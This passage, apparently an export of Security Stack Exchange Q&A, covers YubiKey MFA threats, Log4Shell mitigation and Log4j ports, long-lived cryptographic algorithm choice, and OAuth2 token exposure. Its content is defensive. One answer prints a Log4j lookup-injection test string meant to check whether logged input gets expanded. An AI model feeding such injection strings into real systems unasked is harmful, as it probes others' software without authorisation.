","0","3","257963","<p>The attacker could steal cookies for the session while you are logged in. In case of physical access the attacker could extract keys from the device or potentially modify it. Attacks for extraction are expensive and could make it obvious (disassembly could be required) but they have been succesful in the past if the attacker is well-equipped.</p>
","-1"
"257950","257950","How could someone's account that is secured by MFA Yubikey be compromised?","<p>Let's say that I purchased a MFA Yubikey device to secure my accounts. If an attacker wanted to compromise my accounts that are secured with this YubiKey, would this be possible without having the actual device?</p>
<p>First let's assume the attacker has had no physical access to the device but has been able to compromise other devices that the user uses (PC, Phone, Tablet etc.).  Second, the attacker was able to gain physical access to said device for an unknown amount of time.</p>
","0","3","257965","<p>Just because you have a Yubikey doesn't mean you can't be phished. It's just much much harder. If you reflexively provide MFA codes whenever asked, even when it is unexpected or unsolicited, then it doesn't have a lot of value.</p>
<p>There have also been cases of back channel hacking where the MFA server itself was hacked, and everything relying on it was then vulnerable.</p>
","1"
"257950","257950","How could someone's account that is secured by MFA Yubikey be compromised?","<p>Let's say that I purchased a MFA Yubikey device to secure my accounts. If an attacker wanted to compromise my accounts that are secured with this YubiKey, would this be possible without having the actual device?</p>
<p>First let's assume the attacker has had no physical access to the device but has been able to compromise other devices that the user uses (PC, Phone, Tablet etc.).  Second, the attacker was able to gain physical access to said device for an unknown amount of time.</p>
","0","3","258019","<p>You describe the worst-case scenario.  You are using an untrustworthy device to access sensitive information or significant resources using online services.</p>
<p>Yes, this is a bad idea.</p>
<p>Examples of why:</p>
<p>Attacker replaces your bank bookmarks / hijacks your browser session when you try to visit your bank.  The first attempt to log in is passed directly to the bank and is successful (for the attacker), but you are shown a failed login page.  You are redirected to your bank's actual login page, where you login successfully the second time.  Congratulations, your attacker is now logged into your bank at the same time.</p>
<p>Alternatively, you are done with Facebook for the day and log out (Really?  People log out of Facebook?  Ever?).  The attacker (controlling your computer) intercepts and prevents that logout, and continues on with your Facebook session in your stead.</p>
<p>Even barring those active attacks, the attacker can observe all of the information your account login was protecting as you view it.</p>
<p>All of that said, you are still better protected with hardware MFA than without.  Mitigations for the risks described above would be:</p>
<ul>
<li>Ensure session limits (auto-log-out (e.g. 60 minutes) after you log in, and after you are idle) are enabled for your sensitive sites (banks do this).</li>
<li>Turn on alerting for sensitive operations (withdrawals,for example).</li>
<li>Work to protect the computers you use for sensitive computing.  Simple stuff like antivirus and firewalls and good passwords.</li>
<li>Check / review last-logged-in-time/date/location for your sensitive services, particularly if anything weird happens like you have to log in twice, or your session seems to have lasted past logging out.</li>
</ul>
","1"
"257943","257943","Am I protected from Log4j vulnerability if I run Java 8u121 or newer?","<p>According to the notes for <a href=""https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"" rel=""noreferrer"">CVE-2021-44228</a> at mitre.org:</p>
<blockquote>
<p>Java 8u121 (see
<a href=""https://www.oracle.com/java/technologies/javase/8u121-relnotes.html"" rel=""noreferrer"">https://www.oracle.com/java/technologies/javase/8u121-relnotes.html</a>)
protects against remote code execution by defaulting
&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot; and
&quot;com.sun.jndi.cosnaming.object.trustURLCodebase&quot; to &quot;false&quot;.</p>
</blockquote>
<p>Therefore, assuming the defaults are in place, are my web facing applications protected from the threat this vulnerability introduces if the application is running on JRE/JDK 8u121 or newer?</p>
","35","3","257945","<p>No, you really need to update log4j.</p>
<p>Here is an excerpt from <a href=""https://www.lunasec.io/docs/blog/log4j-zero-day/"" rel=""nofollow noreferrer"">LunaSec's announcement</a>:</p>
<blockquote>
<p>According to <a href=""https://www.cnblogs.com/yyhuni/p/15088134.html"" rel=""nofollow noreferrer"">this blog post</a> (see <a href=""https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en-US"" rel=""nofollow noreferrer"">translation</a>), JDK versions greater than <code>6u211</code>, <code>7u201</code>, <code>8u191</code>, and <code>11.0.1</code> are not affected by the LDAP attack vector. In these versions <code>com.sun.jndi.ldap.object.trustURLCodebase</code> is set to <code>false</code> meaning JNDI cannot load remote code using LDAP.</p>
<p>However, there are other attack vectors targeting this vulnerability which can result in RCE. An attacker could still leverage existing code on the server to execute a payload. An attack targeting the class <code>org.apache.naming.factory.BeanFactory</code>, present on Apache Tomcat servers, is discussed in <a href=""https://www.veracode.com/blog/research/exploiting-jndi-injections-java"" rel=""nofollow noreferrer"">this blog post</a>.</p>
</blockquote>
<p>It looks like the change in 8u121 helped, but it does not entirely prevent an RCE. The recommendation is to upgrade log4j and not trust a Java update to fix it.</p>
","49"
"257943","257943","Am I protected from Log4j vulnerability if I run Java 8u121 or newer?","<p>According to the notes for <a href=""https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"" rel=""noreferrer"">CVE-2021-44228</a> at mitre.org:</p>
<blockquote>
<p>Java 8u121 (see
<a href=""https://www.oracle.com/java/technologies/javase/8u121-relnotes.html"" rel=""noreferrer"">https://www.oracle.com/java/technologies/javase/8u121-relnotes.html</a>)
protects against remote code execution by defaulting
&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot; and
&quot;com.sun.jndi.cosnaming.object.trustURLCodebase&quot; to &quot;false&quot;.</p>
</blockquote>
<p>Therefore, assuming the defaults are in place, are my web facing applications protected from the threat this vulnerability introduces if the application is running on JRE/JDK 8u121 or newer?</p>
","35","3","257960","<p>Probably not, at least according to:</p>
<p><a href=""https://twitter.com/marcioalm/status/1470361495405875200"" rel=""nofollow noreferrer"">https://twitter.com/marcioalm/status/1470361495405875200</a></p>
<p>Basically, the java property changes mean that it won't load a remote class on to the class path. However, the post linked above suggests that the remote server can just return a payload with a standard serialisation attack (leveraging any of the huge number of 'gadget' classes which can be used to cause untrusted code execution).</p>
","4"
"257943","257943","Am I protected from Log4j vulnerability if I run Java 8u121 or newer?","<p>According to the notes for <a href=""https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"" rel=""noreferrer"">CVE-2021-44228</a> at mitre.org:</p>
<blockquote>
<p>Java 8u121 (see
<a href=""https://www.oracle.com/java/technologies/javase/8u121-relnotes.html"" rel=""noreferrer"">https://www.oracle.com/java/technologies/javase/8u121-relnotes.html</a>)
protects against remote code execution by defaulting
&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot; and
&quot;com.sun.jndi.cosnaming.object.trustURLCodebase&quot; to &quot;false&quot;.</p>
</blockquote>
<p>Therefore, assuming the defaults are in place, are my web facing applications protected from the threat this vulnerability introduces if the application is running on JRE/JDK 8u121 or newer?</p>
","35","3","257964","<p><a href=""https://research.kudelskisecurity.com/2021/12/10/log4shell-critical-severity-apache-log4j-remote-code-execution-being-actively-exploited-cve-2021-44228/"" rel=""nofollow noreferrer"">https://research.kudelskisecurity.com/2021/12/10/log4shell-critical-severity-apache-log4j-remote-code-execution-being-actively-exploited-cve-2021-44228/</a></p>
<p>No, you're not safe. Currently we have to assume that the JDK version is irrelevant when it comes to the closing of this vulnerability.</p>
<p>Better safe than sorry I'd say anyway. We're currently rushing to analyse and update all our systems (and that's quite a few in-house and 3rd party applications) to use Log4J2 2.16 or move them away from Log4J altogether (e.g. to Logback or commons logging, whichever is easier to implement rapidly).</p>
<p>As there are of course transient dependencies on old versions aplenty around in most any application, this means not just changing your direct dependencies but also put in a lot of exclusions in your Maven (or whatever) build files to ensure no older versions are pulled in under the hood.</p>
<p>In all the work appears to mostly be rather straightforward, just tedious.</p>
","16"
"257873","257873","Does CVE-2021-44228 impact Log4j ports?","<p>Log4j has been ported to other languages, such as log4perl, log4php, log4net, and log4r. Are these ports vulnerable to <a href=""https://nvd.nist.gov/vuln/detail/CVE-2021-44228"" rel=""noreferrer"">CVE-2021-44228</a> as well? I believe that they aren't because the vulnerability uses JNDI (Java Naming and Directory Interface), which I doubt would be relevant in other languages.</p>
","86","3","257883","<p>That CVE does not impact the ports, only Log4j, since it requires the use of Java interfaces (and some JVM versions prevent the vulnerability from being exploited).  It may be that the ports have similar vulnerabilities, but they would likely be of a substantially different nature such that we would issue a different CVE for them to help distinguish the vulnerabilities, patching, and remediation steps.</p>
","78"
"257873","257873","Does CVE-2021-44228 impact Log4j ports?","<p>Log4j has been ported to other languages, such as log4perl, log4php, log4net, and log4r. Are these ports vulnerable to <a href=""https://nvd.nist.gov/vuln/detail/CVE-2021-44228"" rel=""noreferrer"">CVE-2021-44228</a> as well? I believe that they aren't because the vulnerability uses JNDI (Java Naming and Directory Interface), which I doubt would be relevant in other languages.</p>
","86","3","257928","<p>As per the <a href=""https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"" rel=""noreferrer"">CVE site</a> where common vulnerabilities are posted, it says it affects Log4J through JNDI configurations.</p>
<p>JNDI  is –
The Java Naming and Directory Interface™ (JNDI) is an application programming interface (API) that provides naming and directory functionality to applications written using the Java™ programming language.</p>
<p>Since in .Net applications we do not use Java or it's runtime, this vulnerability won't be affecting .Net world.</p>
","5"
"257873","257873","Does CVE-2021-44228 impact Log4j ports?","<p>Log4j has been ported to other languages, such as log4perl, log4php, log4net, and log4r. Are these ports vulnerable to <a href=""https://nvd.nist.gov/vuln/detail/CVE-2021-44228"" rel=""noreferrer"">CVE-2021-44228</a> as well? I believe that they aren't because the vulnerability uses JNDI (Java Naming and Directory Interface), which I doubt would be relevant in other languages.</p>
","86","3","257933","<p>Let me start with some background info.  As I understand it, the CVE-2021-44228 (&quot;Log4Shell&quot;) vulnerability has three main components:</p>
<ol>
<li><p>A design flaw in Log4j that makes it (by default, before version 2.15.0) parse and expand certain substrings delimited by <code>${</code> and <code>}</code>, known as <a href=""https://logging.apache.org/log4j/2.x/manual/lookups.html"" rel=""noreferrer"">lookups</a>, not only in hardcoded formatting patterns but actually in all logged data, including any user inputs provided as parameters.  This is the part that the recommended mitigation techniques (upgrade to 2.15.0+ or set <code>log4j2.formatMsgNoLookups</code> to true in version 2.10.0+) address.</p>
</li>
<li><p>A particular lookup named <code>jndi</code>, enabled by default, that allows using the <a href=""https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html"" rel=""noreferrer"">JNDI</a> (Java Naming and Directory Interface™) API to load data from arbitrary remote sources using protocols such as <a href=""https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol"" rel=""noreferrer"">LDAP</a>.  Some of the alternative mitigation techniques for older pre-2.10.0 Log4j versions, like <a href=""https://github.com/corretto/hotpatch-for-apache-log4j2"" rel=""noreferrer"">this Java agent hotfix</a>, work by disabling this lookup.</p>
</li>
<li><p>Bugs and/or design flaws in the Java LDAP implementation that make it <a href=""https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"" rel=""noreferrer"">vulnerable to remote code execution</a> if given suitable input data.  There are known ways to mitigate these, but apparently the attack surface is broad and hard to eliminate completely.</p>
</li>
</ol>
<p>The possibility of using JNDI + LDAP for remote code execution has actually been known for some time; the last link above is to a presentation from 2016 discussing it.  Issues with the inappropriate application of lookups to all logged data in Log4j have also been known at least since 2017, when <a href=""https://issues.apache.org/jira/browse/LOG4J2-2109"" rel=""noreferrer"">the option to turn it off was added</a> in version 2.10.0.  But apparently it wasn't considered a major security problem at the time (although IMO it should've been), since without the <code>jndi</code> lookup's ability to make external requests all(!) it allows is a limited form of log forgery.</p>
<p>It was really the combination of all three of these flaws that allowed elevating this easy-to-use but limited log forgery exploit (part 1) into an easy-to-use remote code execution exploit (parts 2 and 3).</p>
<p>(Also, once the RCE exploit became widely known, people figured out that parts 1 and 2 could also be used to leak sensitive data, like private keys stored in environment variables, in the remote requests without actually needing the RCE exploit from part 3.  But AFAIK this was only discovered, or at least publicized, in the past few days after the RCE was already known.)</p>
<hr />
<p>Anyway, the upshot of all this is that log4j ports to other languages <em>may</em> have the same design flaw (part 1 above) allowing lookups to be parsed in user input.  However, <strong>JNDI (part 2) is specific to Java</strong>, so the full RCE exploit in its current form is unlikely to work on log4j ports to non-Java systems.</p>
<p>Of course, I would still consider parsing any <strong>string substitutions in untrusted log data</strong> to be a security flaw and at least a potential entry point for exploit.  Given a potentially vulnerable system, you should be able to test its vulnerability to log4j-style lookup exploits by entering a string like:</p>
<pre><code>TEST ${upper:foo} ${env:HOME:~} ${date:MM-dd-yyyy} ${base64:SGVsbG8gV29ybGQhCg==} $${foo}
</code></pre>
<p>somewhere where it will get logged.  If all that gets logged is the verbatim input string with no changes, your system is <em>probably</em> not vulnerable.  If any of the <code>${}</code> blocks are replaced with something else in the logs, however, or if the <code>$$</code> gets turned into <code>$</code> or any other changes appear, you should report this to the maintainers of the port ASAP and, until it is fixed, look for ways to change this behavior locally e.g. via configuration.</p>
","54"
"257795","257795","Security of hashing and encryption algorithms for 30 years","<p>Assuming a product shelf life of 30 years and the product which is released now in 2021, what is the recommendation/suggestion for hashing or encryption algorithms to use in the product?
That means, should I directly make use of the superior algorithms(SHA-512 for hashing, AES-256 for encryption) or should this be driven by SAL(Security Assurance Level) or any other different factors?</p>
<p>Also, are there any recommendations from NIST to choose these based on the product's shelf life?</p>
","30","5","257796","<p>Using SHA-512 and AES-256 as you suggest is generally not wrong. But this may change in the future.</p>
<p>In detail: It depends on the usecase.</p>
<p>Do you need a block cipher or a stream cipher? Do you want to hash passwords or something else? There are multiple possible algorithms available.</p>
<p>It is required to use appropriate functions, and not outdated/broken functions.  But maybe even more important: Every algorithm can be broken in the future. So it is very important that your product has the ability to be updatable and introduce new hash-/encryption-algorithms which replace the old ones.</p>
","23"
"257795","257795","Security of hashing and encryption algorithms for 30 years","<p>Assuming a product shelf life of 30 years and the product which is released now in 2021, what is the recommendation/suggestion for hashing or encryption algorithms to use in the product?
That means, should I directly make use of the superior algorithms(SHA-512 for hashing, AES-256 for encryption) or should this be driven by SAL(Security Assurance Level) or any other different factors?</p>
<p>Also, are there any recommendations from NIST to choose these based on the product's shelf life?</p>
","30","5","257800","<p>30 years is a really long time for cryptography. Quantum computers might be established there already, but it is hard to predict. Most publications don't look that far in the future.
The <a href=""https://www.keylength.com/en/3/"" rel=""noreferrer"">ECRYPT-RSA Recommendations</a> from 2018 look this far though. Based on this AES-256 for symmetric encryption and SHA-512 as hash should be sufficient. But the <a href=""https://www.ecrypt.eu.org/csa/documents/D5.4-FinalAlgKeySizeProt.pdf"" rel=""noreferrer"">paper</a> also explicitly states on page 59:</p>
<blockquote>
<p>Again we reiterate these are purely key size guidelines and they do
not guarantee security, nor do they guarantee against attacks on the
underlying mathematical primitives.</p>
</blockquote>
<p>Apart from that there is more than the algorithm to deal with. The secrets used in these algorithms need to be protected too for such a long time, both against stealing but also against loss. And the protection should also match the sensitivity of the data, i.e. a teenagers diary needs likely much less protection than top secret government information.</p>
<p>Also, there is a difference between encrypting sensitive data now and protecting these for 30 years or doing a short term encryption of only temporary sensitive communication in 30 years. In the first case the attacker has 30 years time to break the encryption, in the latter case the data might already be useless after some weeks so breaking - which essentially limits the time the attacker is willing to spend to break the data.</p>
","20"
"257795","257795","Security of hashing and encryption algorithms for 30 years","<p>Assuming a product shelf life of 30 years and the product which is released now in 2021, what is the recommendation/suggestion for hashing or encryption algorithms to use in the product?
That means, should I directly make use of the superior algorithms(SHA-512 for hashing, AES-256 for encryption) or should this be driven by SAL(Security Assurance Level) or any other different factors?</p>
<p>Also, are there any recommendations from NIST to choose these based on the product's shelf life?</p>
","30","5","257805","<blockquote>
<p>Assuming a product shelf life of 30 years...</p>
</blockquote>
<p>As commenters have pointed out, this is an unreasonably long expectation for the shelf life.</p>
<blockquote>
<p>what is the recommendation/suggestion for hashing or encryption algorithms to use in the product? That means, should I directly make use of the superior algorithms(SHA-512 for hashing, AES-256 for encryption) or should this be driven by SAL(Security Assurance Level) or any other different factors?</p>
</blockquote>
<p>Since it is very hard to predict the future, I would suggest building your system with current-day best practices. But also, if possible, include the ability to <strong>update</strong> your system/product in the future. Updating is an important part of &quot;security agility,&quot; which lets us adjust to the unknown future. In particular, you could build your system with an eye towards being able to update encryption algorithms in the future.</p>
<blockquote>
<p>Also, are there any recommendations from NIST to choose these based on the product's shelf life?</p>
</blockquote>
<p><a href=""https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf"" rel=""noreferrer"">NIST SP 800-57</a> provides recommendations for key management.</p>
","9"
"257795","257795","Security of hashing and encryption algorithms for 30 years","<p>Assuming a product shelf life of 30 years and the product which is released now in 2021, what is the recommendation/suggestion for hashing or encryption algorithms to use in the product?
That means, should I directly make use of the superior algorithms(SHA-512 for hashing, AES-256 for encryption) or should this be driven by SAL(Security Assurance Level) or any other different factors?</p>
<p>Also, are there any recommendations from NIST to choose these based on the product's shelf life?</p>
","30","5","257810","<p>For symmetric cryptography: use algorithms with 256-bit strength, such as SHA-512, SHA3-512, SHAKE256, KMAC256, HMAC-SHA-512, Chacha20-Poly1305, AES-256 (in various modes, preferably AEAD modes), Camellia-256 (ditto). Few people will commit to any prediction of security in 30 years, although <a href=""https://www.keylength.com/en/3/"" rel=""noreferrer"">Ecrypt does</a>. <a href=""https://www.keylength.com/en/4/"" rel=""noreferrer"">NIST also have recommendations</a> but they don't go as far as 2051. Using robust algorithms in their maximum strength is your best bet anyway. All of these are widely implemented algorithms.</p>
<p>For asymmetric cryptography: nobody knows. If quantum computers work the way we think they might work, they will completely break all the asymmetric cryptography that's in use today. (In contrast, for symmetric cryptography, the effect will be merely to halve the resistance for a given key size.) And if the physics does work, then it's reasonable to think that the technology will get there in less than 30 years. There is an effort to standardize <a href=""https://en.wikipedia.org/wiki/Post-quantum_cryptography"" rel=""noreferrer"">post-quantum cryptography</a> (PQC), but it's still at an exploratory stage, where some cryptographers propose methods and their colleagues try to break them, sometimes successfully, sometimes not. In the short term, PQC is more risky than well-established asymmetric cryptography based on factoring (RSA) or discrete logarithm (ECC).</p>
<p>The only way to keep a device secure for years, let alone decades, is to keep updating it. Make sure your system has <a href=""https://en.wikipedia.org/wiki/Cryptographic_agility"" rel=""noreferrer"">cryptographic agility</a>, i.e. the ability to change which cryptographic primitives it uses. For asymmetric cryptography, you can test agility today by supporting both finite-field methods (RSA, DH) and ECC. You can also start implementing PQC methods, but keep in mind that they're likely to evolve rapidly in the next few years. Implementing PQC methods now is a good idea, at least as testing-only features, because they have an impact on system design: they are not drop-in replacements for classic primitives. For example, many PQC signature schemes are <em>stateful</em>: you can't just generate a key once and keep signing an arbitrary large number of messages. PQC signatures and keys also tend to be much larger than classic ones.</p>
<p>The ability to upgrade is important not just for the ability to change cryptographic algorithms. It must also be possible to fix software bugs and to implement resistance to new attacks. Attacks only every get better, and attack techniques that are considered exotic today may become commonplace tomorrow. For example, <a href=""https://en.wikipedia.org/wiki/Fault_injection"" rel=""noreferrer"">fault injection</a> attacks were for a long time only a concern on very high-security devices such as smart cards and certain military applications. Then came <a href=""https://en.wikipedia.org/wiki/Row_hammer"" rel=""noreferrer"">rowhammer</a>, which showed that fault injection can be carried out on a PC, purely in software. In 30 years, it's likely that the attack techniques will improve a lot, and no software made today will still be secure. Be updated or be pwned.</p>
<p>The software assurance level is pretty much irrelevant to the choice of cryptographic mechanism. It's relevant to the choice of implementation: a higher assurance level means an implementation with better design, more extensive testing, more countermeasures for side channel and fault injection attacks, etc. It's also relevant to where cryptography is used: a higher level tends to require more redundant controls (for example, you may need to have better resistance to hardware tampering, which requires additional encryption inside the device). But even at the most basic level of assurance, cryptography pretty much starts at “unbreakable assuming a perfect implementation”.</p>
","5"
"257795","257795","Security of hashing and encryption algorithms for 30 years","<p>Assuming a product shelf life of 30 years and the product which is released now in 2021, what is the recommendation/suggestion for hashing or encryption algorithms to use in the product?
That means, should I directly make use of the superior algorithms(SHA-512 for hashing, AES-256 for encryption) or should this be driven by SAL(Security Assurance Level) or any other different factors?</p>
<p>Also, are there any recommendations from NIST to choose these based on the product's shelf life?</p>
","30","5","257839","<p>One approach I know from a source close to me is to combine multiple algorithms. Theirs was a case of a bank wanting to keep hashes of documents for decades for integrity guarantees. To make sure integrity could be guaranteed except in a particularly broken scenario, they started with two currently unbroken algorithms, and generated hashes for each document using them both separately (<code>algo1(document)</code> + <code>algo2(document)</code>). The plan was that in case one of the algorithms were broken they could simply swap that one out for another algorithm while maintaining the guarantee of the second algorithm. This way, unless both algorithms are broken at the same time, there's always a trustworthy set of hashes.</p>
<p>I'm not a crypto expert, but I expect for encryption you'd nest the algorithms, encrypting with one and then the other. To swap one out you'd have to  decrypt at least one layer and re-encrypt.</p>
","0"
"257767","257767","Detecting session sharing with OAuth2","<p>In the OAuth2 Implict Grant flow, the access token is added to the URL fragment as part of the redirect from the Authorization Server to the Relying Party. Since this access token is made visible to the end-user in the Callback URL, this URL could be copied to a separate browser (or device), thereby allowing 2 independent browsers to use the same session.</p>
<p>For example, Medium's Facebook SSO login exposes the following Callback URL:</p>
<p><a href=""https://medium.com/m/callback/facebook#access_token=%5BACCESS_TOKEN%5D&amp;data_access_expiration_time=1646537637&amp;expires_in=5162&amp;long_lived_token=%5BLONG_LIVED_TOKEN%5D&amp;state=%5BSTATE%5D"" rel=""nofollow noreferrer"">https://medium.com/m/callback/facebook#access_token=[ACCESS_TOKEN]&amp;data_access_expiration_time=1646537637&amp;expires_in=5162&amp;long_lived_token=[LONG_LIVED_TOKEN]&amp;state=[STATE]</a></p>
<p>This URL could be copied to another browser to allow access to the user's account on another device as long as the access token has not expired.</p>
<p>This could lead to a circumstance where login sessions are not properly logged, as the 2 browsers would be sharing the same session. This may also not be ideal where preventing concurrent sessions is necessary.</p>
<p>However, this type of flow, and the inclusion of the access token in plaintext in the URL, appears to be the standard practice when Oauth2 is used (In fact, <a href=""https://portswigger.net/web-security/oauth"" rel=""nofollow noreferrer"">https://portswigger.net/web-security/oauth</a> appears to take for granted that the access token would be thus exposed, and just tries to limit the damage if an attacker were to get hold of the access token before it expires, e.g., by limiting the scope, recommending use of HSTS to prevent MITM, etc.). So what would be the best way to detect &quot;session sharing&quot;, so that the proper authentication policies can be applied?</p>
","2","3","257772","<p>Oauth2 tokens are designed to be shared over public channels, not for secret or encrypted channels.</p>
<p>That's why a oauth2 token <strong>should not contain sensitive information</strong> and <strong>should expire</strong>.</p>
<p>With this assumption, these tokens will be downloaded(after login) to the web  browser or mobile app. In this sense, no matter if authorization code flow (backend sends the token to the web) or implicit grant flow (token is received directly on the url) are used, token will be accessible in the browser or mobile app.</p>
<p><strong>Regarding to the session</strong>, tokens are not related to the session. Token is just a string in the web(spa) or mobile,  to be sent to the backend (apis/microservices) commonly as an http header. Also this oauth2 token is related to the <strong>authorization</strong></p>
<p><strong>Session</strong> should be managed on the web (Session, cookies), android (SessionManager,  SharedPreferences) or ios (UserSessionPrototype).</p>
<p>Check these links:</p>
<ul>
<li><a href=""https://stackoverflow.com/questions/23720313/android-save-user-session"">https://stackoverflow.com/questions/23720313/android-save-user-session</a></li>
<li><a href=""https://stackoverflow.com/questions/23720313/android-save-user-session"">https://stackoverflow.com/questions/23720313/android-save-user-session</a></li>
<li><a href=""http://dimazen.github.io/blog/2015/08/using-user-session-in-ios/"" rel=""nofollow noreferrer"">http://dimazen.github.io/blog/2015/08/using-user-session-in-ios/</a></li>
</ul>
<p><strong>Session flow for webs</strong></p>
<ul>
<li>when your user enter to your web app, using some session manager you could detect if jane@doe has a valid prior session.</li>
<li>if not, redirect her to the login.</li>
<li>if user enter valid credentials:
<ul>
<li>you must give her a valid access_token</li>
<li>you must flag that <strong>jane@doe</strong> has a valid session, someone in the backend of web or in your security platform.</li>
</ul>
</li>
</ul>
<p>If the same user <strong>jane@doe</strong> tries to enter to the same web in another browser, device, network or different country, you web should be capable of detect this and show a message like &quot;You have a valid session on another device...&quot;</p>
<p>As you can see, oauth2 tokens are not related to the classic and standard way of session management of webs and probably on native mobiles.</p>
<p>Anyway if you want to use oauth2 to detect session sharing, it occurs to me that you can detect if the same access_token is being used from multiple sources ips. You will need to register the ips of your users, handle scenarios like connection from public networks, etc etc. <strong>As you can see, this is not a oauth2 concern</strong></p>
","0"
"257767","257767","Detecting session sharing with OAuth2","<p>In the OAuth2 Implict Grant flow, the access token is added to the URL fragment as part of the redirect from the Authorization Server to the Relying Party. Since this access token is made visible to the end-user in the Callback URL, this URL could be copied to a separate browser (or device), thereby allowing 2 independent browsers to use the same session.</p>
<p>For example, Medium's Facebook SSO login exposes the following Callback URL:</p>
<p><a href=""https://medium.com/m/callback/facebook#access_token=%5BACCESS_TOKEN%5D&amp;data_access_expiration_time=1646537637&amp;expires_in=5162&amp;long_lived_token=%5BLONG_LIVED_TOKEN%5D&amp;state=%5BSTATE%5D"" rel=""nofollow noreferrer"">https://medium.com/m/callback/facebook#access_token=[ACCESS_TOKEN]&amp;data_access_expiration_time=1646537637&amp;expires_in=5162&amp;long_lived_token=[LONG_LIVED_TOKEN]&amp;state=[STATE]</a></p>
<p>This URL could be copied to another browser to allow access to the user's account on another device as long as the access token has not expired.</p>
<p>This could lead to a circumstance where login sessions are not properly logged, as the 2 browsers would be sharing the same session. This may also not be ideal where preventing concurrent sessions is necessary.</p>
<p>However, this type of flow, and the inclusion of the access token in plaintext in the URL, appears to be the standard practice when Oauth2 is used (In fact, <a href=""https://portswigger.net/web-security/oauth"" rel=""nofollow noreferrer"">https://portswigger.net/web-security/oauth</a> appears to take for granted that the access token would be thus exposed, and just tries to limit the damage if an attacker were to get hold of the access token before it expires, e.g., by limiting the scope, recommending use of HSTS to prevent MITM, etc.). So what would be the best way to detect &quot;session sharing&quot;, so that the proper authentication policies can be applied?</p>
","2","3","257774","<p>Indeed, securing web apps 101 says &quot;Don't do it. Always send sensitive data in POST requests rather than in query strings in URLs&quot;. With sensitive data in query strings, it becomes vulnerable to shoulder surfing and other attacks, as <a href=""https://security.stackexchange.com/questions/29598/should-sensitive-data-ever-be-passed-in-the-query-string"">this security stack exchange page resoundingly explains</a>.</p>
<p>And &quot;Information exposure through query strings in url&quot; on the <a href=""https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url"" rel=""nofollow noreferrer"">OWASP web site</a> gives an example that specifically includes authentication tokens:</p>
<blockquote>
<p><a href=""https://vulnerablehost.com/authuser?user=bob&amp;authz_token=1234&amp;expire=1500000000"" rel=""nofollow noreferrer"">https://vulnerablehost.com/authuser?user=bob&amp;authz_token=1234&amp;expire=1500000000</a></p>
<p>The parameter values for user, authz_token, and expire will be exposed in the following locations when using HTTP or HTTPS:</p>
<ul>
<li>Referer Header</li>
<li>Web Logs</li>
<li>Shared Systems</li>
<li>Browser History</li>
<li>Browser Cache</li>
<li>Shoulder Surfing</li>
</ul>
</blockquote>
<p>The only reason I can think of that OAuth2 considers that it is ok, is that the access tokens have a short lifetime and are never reused. But maybe rather than looking for a way to detect session sharing with OAuth2, look for a more secure alternative to OAuth2.</p>
","0"
"257767","257767","Detecting session sharing with OAuth2","<p>In the OAuth2 Implict Grant flow, the access token is added to the URL fragment as part of the redirect from the Authorization Server to the Relying Party. Since this access token is made visible to the end-user in the Callback URL, this URL could be copied to a separate browser (or device), thereby allowing 2 independent browsers to use the same session.</p>
<p>For example, Medium's Facebook SSO login exposes the following Callback URL:</p>
<p><a href=""https://medium.com/m/callback/facebook#access_token=%5BACCESS_TOKEN%5D&amp;data_access_expiration_time=1646537637&amp;expires_in=5162&amp;long_lived_token=%5BLONG_LIVED_TOKEN%5D&amp;state=%5BSTATE%5D"" rel=""nofollow noreferrer"">https://medium.com/m/callback/facebook#access_token=[ACCESS_TOKEN]&amp;data_access_expiration_time=1646537637&amp;expires_in=5162&amp;long_lived_token=[LONG_LIVED_TOKEN]&amp;state=[STATE]</a></p>
<p>This URL could be copied to another browser to allow access to the user's account on another device as long as the access token has not expired.</p>
<p>This could lead to a circumstance where login sessions are not properly logged, as the 2 browsers would be sharing the same session. This may also not be ideal where preventing concurrent sessions is necessary.</p>
<p>However, this type of flow, and the inclusion of the access token in plaintext in the URL, appears to be the standard practice when Oauth2 is used (In fact, <a href=""https://portswigger.net/web-security/oauth"" rel=""nofollow noreferrer"">https://portswigger.net/web-security/oauth</a> appears to take for granted that the access token would be thus exposed, and just tries to limit the damage if an attacker were to get hold of the access token before it expires, e.g., by limiting the scope, recommending use of HSTS to prevent MITM, etc.). So what would be the best way to detect &quot;session sharing&quot;, so that the proper authentication policies can be applied?</p>
","2","3","258139","<p>Copying the callback URL and using it in another browser will not work if the page checks the <code>state</code> parameter:</p>
<blockquote>
<p>The &quot;state&quot; parameter should be used to link the authorization request with the redirect URI used to deliver the access token. This will ensure that the client is not tricked into completing any redirect callback unless it is linked to an authorization request initiated by the client.  The &quot;state&quot; parameter should not be guessable, and the client should be capable of keeping the &quot;state&quot; parameter secret.</p>
</blockquote>
<p>(<a href=""https://datatracker.ietf.org/doc/html/rfc6819#section-4.4.2.5"" rel=""nofollow noreferrer"">RFC 6819, Section 4.4.2.5</a>)</p>
<p>If a user copies the URL to another browser, the state check will fail because the website does not recognize the state value since it did not started that authentication request.</p>
<hr />
<p>The implicit flow with providing tokens in a URL callback is <a href=""https://medium.com/oauth-2/why-you-should-stop-using-the-oauth-implicit-grant-2436ced1c926"" rel=""nofollow noreferrer"">not state of the art nowadays</a> and <a href=""https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-04#section-10"" rel=""nofollow noreferrer"">will be removed in OAuth 2.1</a>.</p>
<p>Instead, the <a href=""https://datatracker.ietf.org/doc/html/rfc6749#section-4.1"" rel=""nofollow noreferrer"">authorization code flow</a> should be used. In this flow a short lived authorization code is included in the callback URL. This code can be redeemed at the token endpoint to obtain the tokens. This is also secured by requiring the client to authenticate with its client credentials and / or by using PKCE (Proof Key for Code Exchange by OAuth Public Clients, <a href=""https://datatracker.ietf.org/doc/html/rfc7636"" rel=""nofollow noreferrer"">RFC 6749</a>).</p>
